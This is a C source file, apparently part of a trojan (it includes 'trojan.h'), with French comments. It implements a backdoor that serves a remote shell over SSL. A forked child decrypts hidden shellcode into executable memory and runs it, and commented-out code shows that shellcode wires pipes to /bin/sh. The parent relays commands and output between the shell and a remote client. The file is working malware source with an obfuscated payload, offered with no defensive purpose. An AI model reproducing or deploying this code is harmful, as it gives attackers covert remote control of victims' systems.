#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <string.h>
#include <openssl/ssl.h>
#include "trojan.h"

/* dup2(to_shell[0], 0); // le shell lit sur stdin ce que le parent écrit (le client)
  dup2(from_shell[1], 1); // le shell écrit son stdout dans le pipe vers le parent
  dup2(from_shell[1], 2);  // pareil pour stderr
  close(to_shell[1]);      // on le ferme car le shell n'écrit pas dans ce pipe
  close(from_shell[0]);    // le shell ne lit pas dans ce pipe
  execl("/bin/sh", "sh", NULL);
  exit(1); */
void call_shellcode(int *to_shell, int *from_shell) {
   
    /* informer le compilateur qu’il ne doit déplacer avant l’appel */
    unsigned char *dest = mmap(NULL, 200, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    get_plaintext(dest);
    register long fd_stdin  asm("rdi") = to_shell[0];
    register long fd_stdout asm("r8")  = from_shell[1];
    register long fd_close1 asm("rdx") = to_shell[1];
    register long fd_close2 asm("rcx") = from_shell[0];

    (void)fd_stdin; (void)fd_stdout; (void)fd_close1; (void)fd_close2;
    ((void(*)())dest)();
    // __asm__ __volatile__ ("" ::: "memory");
    //((void(*)())shellcode)();
    exit(1);
}

void handle_shell(SSL *ssl)
{
    int to_shell[2], from_shell[2];
    char buf[1024];

    if (pipe(to_shell) == -1 || pipe(from_shell) == -1)
        return;

    pid_t pid = fork();
    if (pid == 0) {
        call_shellcode(to_shell, from_shell);
    }

    close(to_shell[0]);
    close(from_shell[1]);

    fd_set readfds;
    while (1) {
        int client_fd = SSL_get_fd(ssl);

        FD_ZERO(&readfds);
        FD_SET(client_fd, &readfds);
        FD_SET(from_shell[0], &readfds);

        int max_fd = (client_fd > from_shell[0]) ? client_fd : from_shell[0];
        if (select(max_fd + 1, &readfds, NULL, NULL, NULL) == -1)
            break;

        /* Lecture du shell -> client */
        if (FD_ISSET(from_shell[0], &readfds)) {
            ssize_t len = read(from_shell[0], buf, sizeof(buf));
            if (len <= 0) break;
            SSL_write(ssl, buf, len);
            SSL_write(ssl, "$> ", 3);
        }

        /* Lecture du client -> shell */
        if (FD_ISSET(client_fd, &readfds)) {
            size_t n;
            if (!SSL_read_ex(ssl, buf, sizeof(buf) - 1, &n) || n == 0)
                break;
            write(to_shell[1], buf, n);
        }
    }

    close(to_shell[1]);
    close(from_shell[0]);
    waitpid(pid, NULL, 0);
}
